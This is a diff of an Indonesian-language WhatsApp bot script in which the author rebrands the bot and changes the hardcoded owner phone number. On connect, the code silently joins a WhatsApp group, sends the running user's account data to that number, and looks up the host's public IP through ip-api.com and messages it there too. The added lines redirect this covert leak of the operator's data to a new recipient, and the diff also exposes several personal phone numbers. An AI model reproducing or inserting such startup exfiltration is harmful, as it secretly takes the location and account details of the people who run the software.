@@ -50,7 +50,7 @@ fakenomor = '0@s.whatsapp.net'
 const gcrevoke = ["6281804680327-1621430788@g.us"]
 prefix = '#'
 shp = '⬡'
-owner = "6285849261085@s.whatsapp.net"
+owner = "62881024358619@s.whatsapp.net"
 spc1 = '         '
 spc2 = '\n                           '
 spc3 = '                   '
@@ -63,7 +63,7 @@ const sleep = async (ms) => {
 const starts = async (client = new WAConnection()) => {
   client.logger.level = "warn";
   client.version = [2, 2123, 8];
-  client.browserDescription = ["FEBZABOTZ", "Chrome", "3.0"];
+  client.browserDescription = ["ARILBOTZ", "Chrome", "3.0"];
   console.log(banner.string);
   client.on("qr", () => {
     console.log(
@@ -115,11 +115,11 @@ await client.connect({ timeoutMs: 30 * 1000 });
  teks = `https://chat.whatsapp.com/LOf2ivzVfS69sflfmnRAqw`
  client.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
  console.log(color('|WRN|', 'yellow'), color('Joined to Forum Whatsapp Bot group', 'cyan'))
- client.sendMessage(`6285849261085@s.whatsapp.net`, `*Hai Owner Pebbot, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Pebri Botz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./pebrikun.jpg'),sourceUrl:"https://wa.me/6285849261085?text=Assalamualaikum"}}})
+ client.sendMessage(`62881024358619@s.whatsapp.net`, `*Hai Owner Pebbot, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Pebri Botz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./pebrikun.jpg'),sourceUrl:"https://wa.me/6285849261085?text=Assalamualaikum"}}})
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       client.sendMessage("6285849261085@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Pebrikun Botz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./pebrikun.jpg'),sourceUrl:"https://wa.me/6285849261085?text=Assalamualaikum"}}})
+       client.sendMessage("62881024358619@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Pebrikun Botz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./pebrikun.jpg'),sourceUrl:"https://wa.me/6285849261085?text=Assalamualaikum"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
       
@@ -145,7 +145,7 @@ fkontakk = { key: {
     participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})
 },
  message: {
-    "contactMessage":{"displayName":'PebzKun',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2; DEVOLOPER;;;\nFN:resku\nitem1.TEL;waid=6285849261085:+62 858-4926-1085\nitem1.X-ABLabel:Mobile\nEND:VCARD"
+    "contactMessage":{"displayName":'PebzKun',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2; DEVOLOPER;;;\nFN:resku\nitem1.TEL;waid=62881024358619:+62 881-0243-58619\nitem1.X-ABLabel:Mobile\nEND:VCARD"
  }}}
 metdata = await client.groupMetadata(anu.jid)
 if(anu.announce == 'false'){
